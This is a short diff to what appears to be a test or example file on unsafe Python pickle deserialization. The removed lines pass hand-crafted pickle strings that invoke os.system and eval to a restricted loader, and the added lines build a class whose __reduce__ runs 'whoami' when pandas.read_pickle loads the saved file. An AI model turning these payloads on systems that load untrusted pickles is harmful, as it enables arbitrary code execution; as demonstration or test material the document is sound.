@@ -1,9 +1,16 @@
-# example tests
-restricted_loads(pickle.dumps([1, 2, range(15)]))
-restricted_loads(b"cos\nsystem\n(S'echo hello world'\ntR.")
-restricted_loads(b'cbuiltins\neval\n'
-    b'(S\'getattr(__import__("os"), "system")'
-    b'("echo hello world")\'\ntR.')
+# example test
+import pickle, os, pandas
+
+class MyEvilPickle(object):
+    def __reduce__(self):
+        return (os.system, ('whoami', ))
+
+pickle_data = pickle.dumps(MyEvilPickle())
+#storing the serialized output into a file in current directory
+with open("backup.data", "wb") as file:
+    file.write(pickle_data)
+
+pandas.read_pickle("backup.data")
 
 ###
 
